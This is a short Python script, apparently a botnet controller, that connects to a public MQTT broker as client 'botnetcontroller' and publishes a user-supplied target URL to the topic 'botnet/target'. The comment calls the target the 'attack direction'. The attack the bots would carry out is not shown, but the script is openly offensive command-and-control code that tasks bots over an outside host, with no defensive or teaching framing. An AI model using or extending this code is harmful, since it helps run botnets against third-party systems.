import paho.mqtt.client as paho
import time

broker="iot.eclipse.org"
port=1883
#target=input("Target: ") #attack direction
#create function for callback
nodeId=-200
target=input("Target: ")   #http://localhost:8000
lastId=3
heartbeat=str(target)+" "+str(lastId)
def on_publish(client,userdata,result): 
    print("data published \n")
    pass

#create client object
client= paho.Client("botnetcontroller")

#assign function to callback
client.on_publish = on_publish

#establish connection
client.connect(broker,port)

#publish

#ret= client1.publish("botnet/target",target)
#print(ret)

ret= client.publish("botnet/target",heartbeat)
print(ret)
